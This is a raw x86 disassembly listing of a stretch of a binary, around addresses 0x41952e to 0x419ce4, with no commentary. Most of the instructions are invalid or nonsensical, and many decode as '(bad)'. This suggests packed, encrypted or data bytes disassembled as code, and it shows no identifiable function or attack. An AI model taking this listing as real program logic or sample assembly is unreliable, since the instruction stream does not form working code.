  41952e:	add    esp,ecx
  419530:	pop    esp
  419531:	in     al,dx
  419532:	cmp    dh,dh
  419534:	je     0x41952b
  419536:	test   bh,bh
  419538:	sbb    esi,DWORD PTR [eax+0x32afd151]
  41953e:	mov    DWORD PTR [eax+0x4f],ebp
  419541:	jno    0x4194f7
  419543:	sub    BYTE PTR [esi+0x1e6281b8],bl
  419549:	stc    
  41954a:	mov    ecx,0x4a454ae4
  41954f:	iret   
  419550:	dec    edx
  419551:	sbb    esp,DWORD PTR [edi-0x77b713d3]
  419557:	jmp    0x7823:0xdece56c6
  41955e:	dec    eax
  41955f:	push   ebp
  419560:	stos   DWORD PTR es:[edi],eax
  419561:	mov    ds:0xdcee92cf,al
  419566:	jb     0x419564
  419568:	out    0xc5,al
  41956a:	arpl   WORD PTR [edx],sp
  41956c:	and    al,0x7f
  41956e:	adc    eax,0x6c50ad10
  419573:	fnstcw WORD PTR [edi]
  419575:	dec    esp
  419576:	mov    bl,BYTE PTR [eax+ecx*1-0x4a]
  41957a:	fadd   DWORD PTR [ecx-0x68490635]
  419580:	mov    ebx,DWORD PTR [edi]
  419582:	(bad)  
  419583:	ja     0x4195f3
  419585:	and    BYTE PTR [edx+eiz*2-0x2d],0x15
  41958a:	fist   DWORD PTR [ecx+0x57]
  41958d:	sbb    dl,dh
  41958f:	icebp  
  419590:	fsubr  st(4),st
  419592:	pop    es
  419593:	(bad)  
  419594:	in     eax,dx
  419595:	jnp    0x419580
  419597:	cmp    eax,DWORD PTR [ebx]
  419599:	and    edx,edi
  41959b:	mov    dh,0x45
  41959d:	sar    BYTE PTR [ebx-0x5edde1aa],cl
  4195a3:	out    0x65,al
  4195a5:	call   0xe9bb:0xca00b71c
  4195ac:	aad    0xc7
  4195ae:	pop    ebp
  4195af:	pop    eax
  4195b0:	sahf   
  4195b1:	pop    es
  4195b2:	mov    edx,0xd89d548e
  4195b7:	fdivr  QWORD PTR [ebx-0x77]
  4195bb:	mov    edx,0x3577a41a
  4195c0:	inc    ebp
  4195c1:	xor    BYTE PTR [esi+eiz*4],bl
  4195c4:	aas    
  4195c5:	in     al,0x59
  4195c7:	nop
  4195c8:	push   esp
  4195c9:	dec    ebp
  4195ca:	addr16 push 0xffffffc9
  4195cd:	in     al,0xfc
  4195cf:	mov    ebp,0xef94e2d1
  4195d4:	xor    DWORD PTR [edx+ebp*4],edi
  4195d7:	mov    esp,0x342db346
  4195dc:	loopne 0x4195cf
  4195de:	ror    BYTE PTR [eax-0x73afe83d],0x3b
  4195e5:	leave  
  4195e6:	lods   al,BYTE PTR ds:[esi]
  4195e7:	mov    ds:0x5cb58ecf,al
  4195ec:	jmp    0x419669
  4195ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195ef:	call   0xc019:0x32304868
  4195f6:	xchg   ebp,eax
  4195f7:	dec    eax
  4195f8:	push   ss
  4195f9:	hlt    
  4195fa:	lods   eax,DWORD PTR ds:[esi]
  4195fb:	(bad)  
  4195fc:	cmp    esi,DWORD PTR [edx]
  4195fe:	lock test dh,bl
  419601:	dec    edi
  419602:	lea    esi,[ebx+ebx*1-0x51dcffbe]
  419609:	and    DWORD PTR [ecx+0x6456654b],0x39b24547
  419613:	lock sub al,0x64
  419616:	and    dl,BYTE PTR [esi-0x788959b3]
  41961c:	(bad)  
  41961d:	pop    ebx
  41961e:	jae    0x419671
  419620:	iret   
  419621:	cmp    eax,0x76c642d1
  419626:	div    DWORD PTR [edx]
  419628:	hlt    
  419629:	cmp    edi,DWORD PTR [ebx]
  41962b:	fistp  QWORD PTR [esi]
  41962d:	es fwait
  41962f:	(bad)  
  419630:	iret   
  419631:	int3   
  419632:	sbb    al,0x3c
  419634:	inc    eax
  419635:	or     edi,DWORD PTR [ebx-0x10]
  419638:	mov    ds:0x226a5021,al
  41963d:	ss pop es
  41963f:	pop    edi
  419640:	retf   
  419641:	cmp    dl,BYTE PTR [esp+edx*1]
  419644:	lock cld 
  419646:	ret    0xcfe
  419649:	les    edi,FWORD PTR [esi+0xc]
  41964c:	dec    ecx
  41964d:	fwait
  41964e:	popa   
  41964f:	sub    ecx,edx
  419651:	scas   al,BYTE PTR es:[edi]
  419652:	shl    DWORD PTR [edi+edi*2-0x1de39070],0x54
  41965a:	stos   DWORD PTR es:[edi],eax
  41965b:	lods   al,BYTE PTR ds:[esi]
  41965c:	xor    ebx,eax
  41965e:	std    
  41965f:	cwde   
  419660:	pop    esp
  419661:	or     dh,bl
  419663:	add    al,0x85
  419665:	popa   
  419666:	iret   
  419667:	or     ebx,DWORD PTR [ecx-0x79]
  41966a:	sti    
  41966b:	arpl   ax,si
  41966d:	dec    edi
  41966e:	repz iret 
  419670:	mov    esp,0x1ce82e46
  419675:	mov    WORD PTR [eax+0x2689663e],ds
  41967b:	data16 icebp 
  41967d:	xchg   DWORD PTR [esp+edi*8+0x39],ebp
  419681:	or     BYTE PTR [esi],ah
  419683:	adc    ch,ch
  419685:	adc    ebp,DWORD PTR [esi-0x1]
  419688:	ret    0x29f0
  41968b:	xchg   BYTE PTR [eax],cl
  41968d:	or     eax,0xd3661f9e
  419692:	pop    eax
  419693:	cmp    DWORD PTR [esi+0x46],ecx
  419696:	test   al,0x1d
  419698:	repz cmp al,0xec
  41969b:	into   
  41969c:	jl     0x4196d2
  41969e:	int3   
  41969f:	pop    esp
  4196a0:	rol    BYTE PTR [edi-0x5c1196f2],1
  4196a6:	shr    BYTE PTR [eax],cl
  4196a8:	push   0xffffffe3
  4196aa:	xchg   edx,eax
  4196ab:	mov    edx,0xa613eae3
  4196b0:	mov    dl,0xb4
  4196b2:	sbb    eax,0xa08ad13b
  4196b7:	in     al,dx
  4196b8:	or     al,0x82
  4196ba:	(bad)
  4196be:	sub    edx,0xffffffb7
  4196c1:	fidivr WORD PTR [esi-0x523dc1fb]
  4196c7:	(bad)  
  4196c8:	stos   DWORD PTR es:[edi],eax
  4196c9:	in     eax,0x63
  4196cb:	sub    eax,0xde242ca8
  4196d0:	stc    
  4196d1:	adc    eax,0xb88529b4
  4196d6:	pop    ss
  4196d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196d8:	xchg   ecx,eax
  4196d9:	adc    esi,esp
  4196db:	sbb    ebp,DWORD PTR [ebp+0x31]
  4196de:	ds pop ecx
  4196e0:	mov    al,ds:0xc497d573
  4196e5:	fbld   TBYTE PTR [edx]
  4196e7:	mov    ds:0xaf4cf085,eax
  4196ec:	add    BYTE PTR [ebx-0x2f443a61],0xe6
  4196f3:	dec    ecx
  4196f4:	add    cl,bh
  4196f6:	in     al,0x9
  4196f8:	outs   dx,BYTE PTR ds:[esi]
  4196f9:	in     al,dx
  4196fa:	cdq    
  4196fb:	out    dx,al
  4196fc:	mov    bh,0x6c
  4196fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196ff:	arpl   WORD PTR [eax+0x7c826fe3],dx
  419705:	pop    ebp
  419706:	pop    ds
  419707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419708:	inc    eax
  419709:	mov    edx,DWORD PTR [eax-0x5a92be0e]
  41970f:	jecxz  0x41978d
  419711:	gs xor al,0xd9
  419714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419715:	adc    eax,DWORD PTR [edi+eax*8+0x94dccef]
  41971c:	dec    ebp
  41971d:	les    ebp,FWORD PTR [esi+ebp*2-0x36]
  419721:	or     ecx,DWORD PTR [ebp*4+0x730a8457]
  419728:	fwait
  419729:	cmp    BYTE PTR [ecx+0x56],0xce
  41972d:	lods   al,BYTE PTR ds:[esi]
  41972e:	lods   al,BYTE PTR ds:[si]
  419730:	xor    ah,ah
  419732:	test   BYTE PTR [edx-0x14],ch
  419735:	out    0xaf,eax
  419737:	push   esp
  419738:	js     0x419701
  41973a:	cs push 0x24
  41973d:	jno    0x4197ad
  41973f:	push   0x51
  419741:	fldenv [edx+0x611b0f2c]
  419747:	add    DWORD PTR [eax-0x29c1daa7],ebp
  41974d:	mov    esi,0x8eb3e2cf
  419752:	cmp    BYTE PTR [ecx-0x62df19b0],bh
  419758:	bound  ebx,QWORD PTR [ebx+0x4d]
  41975b:	std    
  41975c:	pop    ds
  41975d:	stc    
  41975e:	seto   BYTE PTR [ecx+eiz*2+0x25]
  419763:	imul   edi,DWORD PTR [edx+0x29984734],0xffffff98
  41976a:	jl     0x41979c
  41976c:	cmp    BYTE PTR [edx],ch
  41976e:	xor    cl,BYTE PTR [edx-0x56]
  419771:	pop    esp
  419772:	enter  0x40fa,0x5d
  419776:	xchg   ebx,eax
  419777:	mov    al,ds:0xf969e8e
  41977c:	data16 lock mov bl,0x77
  419780:	aaa    
  419781:	adc    eax,0x16380db0
  419786:	sbb    al,0xb
  419788:	jbe    0x41977f
  41978a:	(bad)  
  41978b:	mov    esi,DWORD PTR [ecx]
  41978d:	jp     0x419802
  41978f:	ret    
  419790:	(bad)
  419794:	fmul   QWORD PTR [edi]
  419796:	cdq    
  419797:	or     eax,0xaf32fa73
  41979c:	mov    edi,0x3e428fb
  4197a1:	mov    BYTE PTR [esi-0x2050fe02],al
  4197a7:	daa    
  4197a8:	repz push edx
  4197aa:	leave  
  4197ab:	out    dx,al
  4197ac:	inc    eax
  4197ad:	(bad)  
  4197ae:	fxch   st(7)
  4197b0:	jmp    0xdb3e733c
  4197b5:	add    al,0x4f
  4197b7:	pop    ebp
  4197b8:	test   DWORD PTR [eax-0x17],esi
  4197bb:	mov    cl,0x8c
  4197bd:	enter  0x271b,0x49
  4197c1:	fwait
  4197c2:	pop    esp
  4197c3:	pop    ds
  4197c4:	pop    esi
  4197c5:	mov    ah,0xe7
  4197c7:	cmp    edi,DWORD PTR [eax+0x131648e0]
  4197cd:	inc    edi
  4197ce:	xlat   BYTE PTR ds:[ebx]
  4197cf:	mov    al,ah
  4197d1:	cdq    
  4197d2:	ror    cl,1
  4197d4:	or     eax,0x7e8cdabb
  4197d9:	and    esi,ecx
  4197db:	pop    ebx
  4197dc:	or     ch,BYTE PTR [ecx]
  4197de:	xor    DWORD PTR [eax],ebp
  4197e0:	test   edi,edx
  4197e2:	adc    ebp,DWORD PTR [edi-0x3b]
  4197e5:	dec    esp
  4197e6:	pushf  
  4197e7:	pop    ebx
  4197e8:	ret    
  4197e9:	adc    bl,BYTE PTR [eax+edi*4]
  4197ec:	js     0x419836
  4197ee:	jae    0x4197e0
  4197f0:	xchg   BYTE PTR [ecx+0x30],bl
  4197f3:	cmp    al,0x72
  4197f5:	sub    eax,0x64c6b21b
  4197fa:	enter  0x9ca6,0x3a
  4197fe:	sti    
  4197ff:	cli    
  419800:	stos   BYTE PTR es:[edi],al
  419801:	cdq    
  419802:	sbb    ecx,DWORD PTR [esp+ecx*1+0x20e3199c]
  419809:	stos   DWORD PTR es:[edi],eax
  41980a:	xchg   ecx,eax
  41980b:	jne    0x41988b
  41980d:	ss adc al,0x9e
  419810:	retf   
  419811:	rcr    BYTE PTR [ebx+0x20],1
  419814:	ror    BYTE PTR [ebp-0x22931d3c],cl
  41981a:	lock push edi
  41981c:	jp     0x41983c
  41981e:	retf   
  41981f:	push   eax
  419820:	aas    
  419821:	dec    esi
  419822:	and    ebp,DWORD PTR [ecx-0x74dfb462]
  419828:	ror    DWORD PTR [esi],0x40
  41982b:	ins    BYTE PTR es:[edi],dx
  41982c:	pop    ds
  41982d:	cmp    al,0x49
  41982f:	das    
  419830:	mov    ds:0x353ad93,al
  419835:	sbb    eax,0x7b3615f8
  41983a:	dec    esp
  41983b:	xchg   ebp,eax
  41983c:	(bad)  
  41983d:	(bad)  
  41983e:	popf   
  41983f:	lea    eax,[ecx]
  419841:	pusha  
  419842:	push   cs
  419843:	pop    esi
  419844:	stos   BYTE PTR es:[edi],al
  419845:	dec    ebp
  419846:	or     bh,BYTE PTR es:[eax-0x25951553]
  41984d:	jb     0x4197de
  41984f:	cli    
  419850:	out    0xd0,al
  419852:	xor    eax,0xfcd53776
  419857:	jnp    0x4198ba
  419859:	mov    ch,0x4
  41985b:	sbb    BYTE PTR [ebx],ah
  41985d:	and    BYTE PTR ds:0xc201380c,dh
  419863:	or     esi,DWORD PTR [ebp-0xe]
  419866:	pop    ebx
  419867:	add    DWORD PTR ds:0xc7742bdf,esi
  41986d:	sub    ebp,0xffffffbf
  419870:	sar    DWORD PTR [eax-0x7fc82c32],0x8
  419877:	xchg   DWORD PTR [edi-0x57],ecx
  41987a:	(bad)  
  41987b:	push   0x6d00bd91
  419880:	mov    edi,0x7a7205f3
  419885:	xchg   esi,eax
  419886:	mov    dl,0x5e
  419888:	mov    eax,0x98343749
  41988d:	mov    esp,0x29a859b
  419892:	aaa    
  419893:	pop    ecx
  419894:	(bad)  
  419895:	and    eax,0x369b5a1f
  41989a:	(bad)  
  41989b:	(bad)  [ecx]
  41989d:	rcr    DWORD PTR [eax+0x623b9996],0x57
  4198a4:	(bad)  
  4198a5:	xor    DWORD PTR [ebx],ebp
  4198a7:	ja     0x4198f8
  4198a9:	imul   ecx,DWORD PTR [ebx],0xffffff81
  4198ac:	sub    al,0xe9
  4198ae:	mov    ?,WORD PTR [esi+esi*2]
  4198b1:	fidiv  DWORD PTR [ebx]
  4198b3:	loop   0x41991e
  4198b5:	ret    
  4198b6:	cli    
  4198b7:	mov    bh,0x7c
  4198b9:	mov    dh,BYTE PTR [edi-0x80]
  4198bc:	hlt    
  4198bd:	fisttp QWORD PTR [edx+ebp*2+0x5ea4afef]
  4198c4:	fistp  DWORD PTR ss:[ecx]
  4198c7:	hlt    
  4198c8:	lahf   
  4198c9:	push   ebp
  4198ca:	scas   al,BYTE PTR es:[edi]
  4198cb:	fwait
  4198cc:	ins    DWORD PTR es:[edi],dx
  4198cd:	push   0xa19523cb
  4198d2:	and    BYTE PTR [esi],ah
  4198d4:	mov    cl,BYTE PTR [esi+0x48be1ae0]
  4198da:	xlat   BYTE PTR ds:[ebx]
  4198db:	push   0xa884f66
  4198e0:	sub    DWORD PTR [ecx+0x7c],esi
  4198e3:	jecxz  0x4198cf
  4198e5:	aaa    
  4198e6:	fwait
  4198e7:	popf   
  4198e8:	fmul   DWORD PTR [esi+ebp*4+0x4d]
  4198ec:	popf   
  4198ed:	sbb    DWORD PTR [edx],ebp
  4198ef:	stos   DWORD PTR es:[edi],eax
  4198f0:	sub    al,0xd9
  4198f2:	fdivr  DWORD PTR [eax+0x7b0f000b]
  4198f8:	cwde   
  4198f9:	adc    ebx,DWORD PTR [esi+0x522efabb]
  4198ff:	add    eax,0x351ff880
  419904:	mov    al,0xc9
  419906:	sti    
  419907:	(bad)  
  419908:	mov    bl,0x75
  41990a:	inc    ecx
  41990b:	jne    0x4198aa
  41990d:	or     edi,ecx
  41990f:	xchg   al,bh
  419911:	xchg   edi,eax
  419912:	pop    DWORD PTR [edi+esi*4+0x4b]
  419916:	rcr    DWORD PTR [eax+0x1],1
  419919:	outs   dx,DWORD PTR ds:[esi]
  41991a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41991b:	or     DWORD PTR [ebp-0x50184e81],esi
  419921:	outs   dx,BYTE PTR ds:[esi]
  419922:	scas   eax,DWORD PTR es:[edi]
  419923:	js     0x4198e5
  419925:	leave  
  419926:	sbb    al,0x6
  419928:	ins    BYTE PTR es:[edi],dx
  419929:	fwait
  41992a:	out    dx,al
  41992b:	scas   al,BYTE PTR es:[edi]
  41992c:	xor    DWORD PTR [esi+0x506b6328],edx
  419932:	call   FWORD PTR [ebx+0x11]
  419935:	(bad)  
  419938:	sub    DWORD PTR [edi+0x498abdaf],0xffffffef
  41993f:	xchg   BYTE PTR [esi+0x10807349],ch
  419945:	jl     0x41994b
  419947:	push   esi
  419948:	shr    ch,cl
  41994a:	sbb    al,0xeb
  41994c:	push   ds
  41994d:	push   ecx
  41994e:	xchg   ecx,eax
  41994f:	repz sahf 
  419951:	or     DWORD PTR [eax+0x13],eax
  419954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419955:	and    bl,bl
  419957:	cld    
  419958:	dec    edx
  419959:	div    DWORD PTR [edi-0x38]
  41995c:	add    DWORD PTR fs:[edi+0xf],ecx
  419960:	xchg   BYTE PTR [ecx-0x2ca85151],dl
  419966:	(bad)  
  419967:	sbb    esp,DWORD PTR [eax]
  419969:	call   DWORD PTR [eax-0x26c9a4d3]
  41996f:	aaa    
  419970:	aas    
  419971:	popa   
  419972:	fldenv [ebx-0x1dbd196c]
  419978:	xor    eax,0x7ec86920
  41997d:	int    0xee
  41997f:	add    esi,DWORD PTR [edx+0x0]
  419982:	adc    esp,esi
  419984:	(bad)  [esi-0x3c]
  419987:	test   al,0xba
  419989:	daa    
  41998a:	fmul   QWORD PTR [esp+ebx*8-0x54]
  41998e:	pop    ebp
  41998f:	pop    esi
  419990:	cmp    al,0x70
  419992:	cwde   
  419993:	push   ds
  419994:	test   BYTE PTR [esp+ebx*8],bh
  419997:	hlt    
  419998:	daa    
  419999:	aaa    
  41999a:	push   esi
  41999b:	(bad)  
  41999c:	jb     0x419959
  41999e:	cmp    DWORD PTR [edx],esi
  4199a0:	sbb    eax,0xb4651c61
  4199a5:	fidivr DWORD PTR [ecx+0x52]
  4199a8:	and    esp,edx
  4199aa:	imul   BYTE PTR [ebx]
  4199ac:	mov    ebp,0x3958f50e
  4199b1:	jbe    0x419984
  4199b3:	push   edi
  4199b4:	pusha  
  4199b5:	clc    
  4199b6:	lds    eax,FWORD PTR [ebx+0x52]
  4199b9:	sub    dl,BYTE PTR [edi+0x50]
  4199bc:	div    DWORD PTR [ebx-0x35]
  4199bf:	loop   0x4199e4
  4199c1:	lea    edi,[edi+0x7b42421b]
  4199c7:	jne    0x419a1e
  4199c9:	cld    
  4199ca:	push   es
  4199cb:	adc    eax,0x35a82ce1
  4199d0:	jle    0x4199a0
  4199d2:	xor    ah,BYTE PTR [ecx-0x49]
  4199d5:	jns    0x419974
  4199d7:	jnp    0x419972
  4199d9:	dec    ecx
  4199da:	pop    esp
  4199db:	push   ebp
  4199dc:	push   esp
  4199dd:	adc    bh,BYTE PTR [edi+0x1]
  4199e0:	jae    0x4199af
  4199e2:	mov    esp,0x259a0a81
  4199e7:	jp     0x419a12
  4199e9:	pop    ebp
  4199ea:	outs   dx,DWORD PTR ds:[esi]
  4199eb:	sub    eax,DWORD PTR [ebx-0x71]
  4199ee:	and    BYTE PTR [ebp-0x37],ah
  4199f1:	call   0x384cb942
  4199f6:	or     ebx,DWORD PTR [edx+0x54]
  4199f9:	sub    eax,DWORD PTR [ebx]
  4199fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199fc:	or     ebp,DWORD PTR [edi]
  4199fe:	and    bh,bl
  419a00:	inc    edi
  419a01:	dec    edi
  419a02:	xor    eax,0xe36c1793
  419a07:	repnz add DWORD PTR [edx+0x4e203b3a],esp
  419a0e:	ds sbb eax,0xa12ad6d6
  419a15:	mov    gs,WORD PTR [eax]
  419a17:	icebp  
  419a18:	stos   BYTE PTR es:[edi],al
  419a19:	fnstcw WORD PTR [eax+0x644e4bdc]
  419a1f:	mov    eax,ds:0x4b257770
  419a24:	xchg   edi,eax
  419a25:	data16 (bad) 
  419a27:	ds mov al,0x5
  419a2a:	sar    DWORD PTR [edi+0x7844aad],0x8e
  419a31:	(bad)  
  419a32:	sar    DWORD PTR [ebp-0x73],1
  419a35:	sub    ah,dl
  419a37:	mov    ebx,0x4c65dc3
  419a3c:	push   edi
  419a3d:	add    DWORD PTR [eax+0x46],ebx
  419a40:	popf   
  419a41:	jb     0x419a9a
  419a43:	xchg   edi,eax
  419a45:	loop   0x4199e4
  419a47:	push   0xbdd38e5e
  419a4c:	loopne 0x419a34
  419a4e:	or     DWORD PTR [edi+0x3bf0f755],ebx
  419a54:	jo     0x419aab
  419a56:	inc    ebp
  419a57:	cmp    eax,0xb8d83e48
  419a5c:	iret   
  419a5d:	or     edx,DWORD PTR [edx-0x5c]
  419a60:	nop
  419a61:	push   eax
  419a62:	scas   al,BYTE PTR es:[edi]
  419a63:	fistp  DWORD PTR [edx]
  419a65:	test   eax,0x6b2f0e92
  419a6a:	add    BYTE PTR [ebx+eax*1],cl
  419a6d:	(bad)  
  419a6e:	arpl   WORD PTR [edx+0x1c52c932],si
  419a74:	(bad)  
  419a76:	ins    BYTE PTR es:[edi],dx
  419a77:	popa   
  419a78:	jne    0x419a55
  419a7a:	fs mov ebp,0x7c5196c
  419a81:	cmp    eax,0xca209c1
  419a86:	mov    DWORD PTR [edi+0x72],eax
  419a89:	inc    esi
  419a8a:	mov    ch,0x96
  419a8c:	lods   al,BYTE PTR ds:[esi]
  419a8d:	xchg   esp,eax
  419a8e:	xchg   esp,eax
  419a8f:	xor    bh,BYTE PTR [eax]
  419a91:	in     eax,0xab
  419a93:	ja     0x419ab1
  419a95:	in     al,0x71
  419a97:	or     ebp,DWORD PTR [edx]
  419a99:	sub    bh,bh
  419a9b:	push   es
  419a9c:	les    eax,FWORD PTR [esi-0x15a0a7e7]
  419aa2:	mov    al,ds:0x94162d3c
  419aa7:	xor    esp,esi
  419aa9:	add    al,0xac
  419aab:	inc    esp
  419aac:	xor    BYTE PTR [edx+0x6c24592e],0xeb
  419ab3:	xchg   esp,eax
  419ab4:	mov    dl,0x29
  419ab6:	and    ebx,DWORD PTR [esi]
  419ab8:	std    
  419ab9:	and    BYTE PTR ds:0x440992e3,al
  419abf:	in     al,dx
  419ac0:	retf   0x8938
  419ac3:	mov    al,0xb5
  419ac5:	cmp    BYTE PTR ds:0x227d7d13,dl
  419acb:	mov    al,ds:0xe050f430
  419ad0:	fbstp  TBYTE PTR [esi+0x2f]
  419ad3:	scas   eax,DWORD PTR es:[edi]
  419ad4:	sbb    bl,BYTE PTR [ebx]
  419ad6:	or     ch,BYTE PTR [edx+0xe]
  419ad9:	fmulp  st(5),st
  419adb:	adc    cl,BYTE PTR [edi+0x616cbdc]
  419ae1:	mov    ecx,0xbe3be51f
  419ae6:	repz xchg esp,eax
  419ae8:	aad    0x16
  419aea:	xor    esi,ecx
  419aec:	sub    esi,eax
  419aee:	mov    eax,DWORD PTR [ebp-0x4]
  419af1:	add    esi,edx
  419af3:	cmp    DWORD PTR [eax],esi
  419af5:	mov    eax,DWORD PTR [ebp-0x4]
  419af8:	mov    esi,DWORD PTR [ebp+0x10]
  419afb:	jg     0x41becb
  419b01:	jmp    0x41bebb
  419b06:	push   ecx
  419b07:	bound  esp,QWORD PTR [ebp+0x516ab665]
  419b0d:	jp     0x419af1
  419b0f:	xchg   ebx,eax
  419b10:	js     0x419adb
  419b12:	mov    ah,BYTE PTR [ecx-0x2f]
  419b15:	push   eax
  419b16:	inc    edi
  419b17:	fdivr  QWORD PTR [ebx+edi*2+0x18]
  419b1b:	sahf   
  419b1c:	jnp    0x419b99
  419b1e:	xor    DWORD PTR [esi],0x632cf337
  419b24:	mov    dl,0x15
  419b26:	pop    ss
  419b27:	mov    edi,0xf1ccfda9
  419b2c:	pop    es
  419b2d:	jmp    0xf233:0x3723ccd3
  419b34:	test   DWORD PTR [edx],esi
  419b36:	(bad)  
  419b37:	sub    DWORD PTR ds:0xc4e11dd8,edi
  419b3d:	jl     0x419b21
  419b3f:	xor    ecx,DWORD PTR [ebx]
  419b41:	push   edi
  419b42:	jmp    0x247e604e
  419b47:	inc    edx
  419b48:	cmc    
  419b49:	add    al,0x58
  419b4b:	mov    cl,BYTE PTR [edx]
  419b4d:	into   
  419b4e:	mov    DWORD PTR [ebx],0xa9dccee6
  419b54:	adc    al,BYTE PTR [esi+0x5e102a2a]
  419b5a:	mov    esi,0xc38b61cb
  419b5f:	cmp    edi,DWORD PTR [ebx]
  419b61:	call   0x3ca9:0x9ee9b16f
  419b68:	mov    cl,0x33
  419b6a:	xchg   esp,eax
  419b6b:	xchg   esp,eax
  419b6c:	mov    ch,0xbf
  419b6e:	ins    DWORD PTR es:[edi],dx
  419b6f:	mov    ch,0x3f
  419b71:	dec    edx
  419b72:	dec    eax
  419b73:	cwde   
  419b74:	mov    bl,0xd9
  419b76:	jbe    0x419b43
  419b78:	retf   0xbc38
  419b7b:	inc    eax
  419b7c:	outs   dx,BYTE PTR ds:[esi]
  419b7d:	mov    ch,0xbf
  419b7f:	cmp    DWORD PTR [edi+0x1c],edx
  419b82:	xchg   esp,eax
  419b83:	dec    ebp
  419b84:	mov    esp,0xf314404d
  419b89:	in     al,0xe8
  419b8b:	xor    al,0xac
  419b8d:	xchg   ebp,eax
  419b8e:	shl    BYTE PTR [ebx],1
  419b90:	push   0x6b
  419b92:	addr16 in al,0x74
  419b95:	adc    eax,DWORD PTR [ecx+0xb]
  419b98:	(bad)  
  419b99:	xor    DWORD PTR ds:0x9ea3e4a5,ebp
  419b9f:	add    esp,DWORD PTR [esi+0x1a]
  419ba2:	cs (bad) 
  419ba4:	fcom   QWORD PTR [eax-0x65]
  419ba7:	jmp    0x419c07
  419ba9:	add    al,0xc3
  419bab:	(bad)  
  419bac:	call   0xb0231e82
  419bb1:	sub    al,0x51
  419bb3:	cmp    ah,BYTE PTR [ebx-0x60]
  419bb6:	mov    ebp,0x30f50e07
  419bbb:	cwde   
  419bbc:	aaa    
  419bbd:	add    DWORD PTR [ebx+0x59132165],0x5774d523
  419bc7:	mov    eax,ds:0x600f11f
  419bcc:	sub    dh,BYTE PTR [edx]
  419bce:	idiv   DWORD PTR [esi]
  419bd0:	sub    edx,DWORD PTR [ebx]
  419bd2:	sbb    edx,eax
  419bd4:	cdq    
  419bd5:	popf   
  419bd6:	or     dl,dh
  419bd8:	call   0x809f:0x6134f091
  419bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419be0:	stos   DWORD PTR es:[edi],eax
  419be1:	retf   0xe227
  419be4:	in     eax,dx
  419be5:	mov    dl,0x13
  419be7:	jp     0x419bc5
  419be9:	loopne 0x419bc3
  419beb:	int    0x8a
  419bed:	add    eax,esp
  419bef:	jge    0x419c4f
  419bf1:	je     0x419c54
  419bf3:	or     eax,0xb93e8226
  419bf8:	arpl   WORD PTR [ebp-0x5309ed0b],dx
  419bfe:	push   0x7227c90c
  419c03:	in     eax,dx
  419c04:	je     0x419c68
  419c06:	loop   0x419bd1
  419c08:	(bad)  
  419c09:	in     al,0xc5
  419c0b:	inc    edx
  419c0c:	mov    cl,0x74
  419c0e:	cmp    eax,0xda043df6
  419c13:	out    dx,eax
  419c14:	mov    BYTE PTR [ebp+ebp*4+0x7a3404f8],bl
  419c1b:	rcr    ah,0x0
  419c1e:	push   cs
  419c1f:	mov    ds:0x3e1a52e6,al
  419c24:	gs pop edi
  419c26:	js     0x419bf4
  419c28:	lods   eax,DWORD PTR ds:[esi]
  419c29:	add    cl,BYTE PTR [ebp+0x3]
  419c2c:	imul   esp,DWORD PTR [ecx+0x6c5ff45f],0x51
  419c33:	gs sub dl,ch
  419c36:	retf   0x62f7
  419c39:	enter  0xce2,0xf
  419c3d:	jb     0x419bdc
  419c3f:	sbb    DWORD PTR [eax+0x73],0x53
  419c43:	xchg   ecx,eax
  419c44:	je     0x419be4
  419c46:	xchg   ebp,eax
  419c47:	jl     0x419c67
  419c49:	sahf   
  419c4a:	outs   dx,BYTE PTR ds:[esi]
  419c4b:	sbb    DWORD PTR [eax-0x14],ebp
  419c4e:	mov    dl,0x3c
  419c50:	jle    0x419c9a
  419c52:	rol    DWORD PTR [edi+eiz*8+0x59],0xb1
  419c57:	mov    dh,BYTE PTR [esi+0x6e]
  419c5a:	sub    edx,DWORD PTR [edx]
  419c5c:	jg     0x419c3b
  419c5e:	push   ebp
  419c5f:	jg     0x419cb8
  419c61:	scas   eax,DWORD PTR es:[edi]
  419c62:	lahf   
  419c63:	adc    al,0x49
  419c65:	(bad)
  419c6b:	jge    0x419c2b
  419c6d:	adc    dl,bh
  419c6f:	dec    ebx
  419c70:	cmp    BYTE PTR [esi+ebx*8],cl
  419c73:	out    dx,al
  419c74:	dec    ebx
  419c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c76:	push   ebp
  419c77:	cmp    bh,bh
  419c79:	std    
  419c7a:	std    
  419c7b:	push   ebx
  419c7c:	cmc    
  419c7d:	cdq    
  419c7e:	and    ch,0x13
  419c81:	sbb    eax,0x7a7b3f82
  419c86:	(bad)
  419c89:	jl     0x419cab
  419c8b:	jbe    0x419c12
  419c8d:	leave  
  419c8e:	add    BYTE PTR ds:0x4d2f6b1e,dh
  419c94:	ror    BYTE PTR [edi],cl
  419c96:	out    dx,eax
  419c97:	xor    eax,0xb718b6a1
  419c9c:	aaa    
  419c9d:	adc    ch,dl
  419c9f:	push   0x2c94fe7a
  419ca4:	push   ds
  419ca5:	out    dx,al
  419ca6:	add    esp,ecx
  419ca8:	sub    DWORD PTR [edx],esp
  419caa:	jo     0x419cbd
  419cac:	mov    dl,bl
  419cae:	push   0xffffffc6
  419cb0:	pop    edx
  419cb1:	inc    ebx
  419cb2:	mov    ds:0x62f1a913,eax
  419cb7:	or     esi,DWORD PTR [ecx+0xb55aa3f]
  419cbd:	fimul  DWORD PTR [ebx-0x6e]
  419cc0:	lds    ebp,FWORD PTR [ebp-0x540c105d]
  419cc6:	inc    edi
  419cc7:	mov    eax,ds:0x6cddb2e6
  419ccc:	xchg   BYTE PTR [edx+0x7f8fa8e4],dh
  419cd2:	inc    ebx
  419cd3:	sbb    cl,BYTE PTR [edx]
  419cd5:	stc    
  419cd6:	icebp  
  419cd7:	pop    esp
  419cd8:	mov    cl,0x8d
  419cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cdb:	aad    0xfb
  419cdd:	fwait
  419cde:	mov    cl,0xc5
  419ce0:	or     al,0x94
  419ce2:	xchg   al,cl
  419ce4:	aas    
